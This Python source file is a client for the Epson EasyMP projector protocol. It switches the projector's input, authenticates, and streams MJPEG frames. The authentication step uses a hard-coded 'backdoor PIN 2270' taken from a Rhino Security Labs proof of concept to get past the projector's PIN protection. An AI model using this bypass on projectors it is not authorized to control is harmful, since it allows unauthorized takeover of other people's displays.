import socket
import time
import struct
from . import config
from . import payloads

class ProtocolError(Exception):
    pass

class EpsonEasyMPClient:
    def __init__(self, projector_ip=None, my_ip=None):
        self.projector_ip = projector_ip or config.PROJECTOR_IP
        self.my_ip = my_ip or config.get_local_ip()
        
        # Sockets
        self.s_hardware = None # Port 3629
        self.s_auth = None     # Port 3620
        self.s_video = None    # Port 3621
    
    def connect_and_negotiate(self):
        """Executes the deterministic state-machine based connect sequence."""
        print(f"[*] Starting deterministic negotiation sequence with {self.projector_ip}...")
        
        try:
            # 1. Hardware Control Connect (TCP 3629)
            try:
                self._switch_hardware_source()
            except Exception as e:
                print(f"[-]    Warning: Hardware control channel (3629) failed ({e}). Skipping to Auth.")
            
            # 2. Authentication Connect (TCP 3620)
            self._authenticate_session()
            
            # 3. Transport Stream Connect (TCP 3621)
            self._open_video_channel()
            
            print("\n[+] BINGO! Connection Fully Established and Ready for Video Stream!")
            return True
                
        except Exception as e:
            print(f"[-] Negotiation failed: {e}")
            self.disconnect()
            return False

    def _switch_hardware_source(self):
        print(f"[*] 1. Opening Hardware Control Channel (Port 3629)...")
        self.s_hardware = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s_hardware.settimeout(5)
        self.s_hardware.connect((self.projector_ip, config.PORT_WAKE))
        
        # ASCII command to switch source to LAN/EasyMP
        cmd = b"SOURCE 30\r"
        print(f"[*]    Sending command: {cmd}")
        self.s_hardware.send(cmd)
        
        resp = self.s_hardware.recv(1024)
        print(f"[+]    Hardware response: {resp}")
        
        # Wait for either colon ':' response or just assume success if no crash
        if b':' not in resp:
            print("[-]    Warning: Did not see ':' prompt in hardware response.")
            
        # The dossier says to leave it open to query state, but we can close it or keep it open.
        # Let's keep it open in self.s_hardware

    def _authenticate_session(self):
        print(f"[*] 2. Opening Authentication Channel (Port 3620)...")
        self.s_auth = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s_auth.settimeout(5)
        self.s_auth.connect((self.projector_ip, config.PORT_CONTROL))
        
        # Get backdoor payload
        auth_payload = payloads.get_auth_payload(pin="2270")
        print(f"[*]    Sending Auth Request (Backdoor PIN 2270), length={len(auth_payload)}")
        self.s_auth.sendall(auth_payload)
        
        # Read exactly 52 bytes or at least 52 bytes
        # Some times read() just returns whatever is available, let's read iteratively if needed, or just up to 64
        response = bytearray()
        # Dossier says: "must read exactly 52 bytes into a buffer" or at least check 51st byte
        # Wait up to a second for data
        data = self.s_auth.recv(1024)
        response.extend(data)
        
        print(f"[+]    Auth response length: {len(response)} bytes")
        if len(response) <= 50:
            raise ProtocolError(f"Auth response too short: {len(response)} bytes")
            
        # The Rhino Security Labs PoC validates by hexlifying and checking index 50
        import binascii
        resp_hex = binascii.hexlify(data).decode('ascii')
        
        if len(resp_hex) > 50:
            auth_flag = resp_hex[50]
            print(f"[*]    Auth flag (50th hex char): {auth_flag}")
            
            if auth_flag != "0":
                print("[+]    Authentication SUCCEEDED!")
            else:
                raise ProtocolError(f"Authentication REJECTED or failed. 50th hex char is '0'. Response: {resp_hex}")
        else:
            raise ProtocolError(f"Authentication response too short: {len(resp_hex)} hex characters")

    def _open_video_channel(self):
        print(f"[*] 3. Opening Video Channel (Port 3621)...")
        time.sleep(0.5) # Slight delay purely to let Projector OS transition state
        self.s_video = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s_video.settimeout(5)
        self.s_video.connect((self.projector_ip, config.PORT_VIDEO))
        print("[+]    Video Channel OPEN. Ready to stream PCON-wrapped MJPEG.")

    def send_video_frame(self, x_offset, y_offset, width, height, mjpeg_bytes):
        """Wraps MJPEG stream data in PCON header and sends to Port 3621."""
        if not self.s_video:
            print("[-] Cannot send video frame. Video socket not initialized!")
            return False
            
        try:
            # Construct PCON header
            pcon_header = payloads.get_pcon_video_header(x_offset, y_offset, width, height, len(mjpeg_bytes))
            
            # Send synchronously
            self.s_video.sendall(pcon_header + mjpeg_bytes)
            return True
        except Exception as e:
            print(f"[-] Stream interrupted: {e}")
            return False

    def disconnect(self):
        """Tears down all connections safely."""
        print("[*] Disconnecting client...")
        if self.s_hardware:
            try: self.s_hardware.close()
            except: pass
        if self.s_auth:
            try: self.s_auth.close()
            except: pass
        if self.s_video:
            try: self.s_video.close()
            except: pass
